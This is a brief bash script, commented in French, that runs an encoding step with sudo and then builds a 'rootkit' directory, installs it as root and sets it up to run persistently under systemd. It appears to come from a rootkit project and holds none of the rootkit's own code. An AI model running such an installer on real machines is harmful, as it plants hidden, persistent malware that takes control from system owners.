#!/bin/bash
set -e


echo "Lancement de l'encodage du script"

sudo bash encodage.sh init &&

echo "Lancer le makefile du rootkit"
cd rootkit && make all && sudo bash install.sh && make compile-and-run-in-systemd &&

exit 0
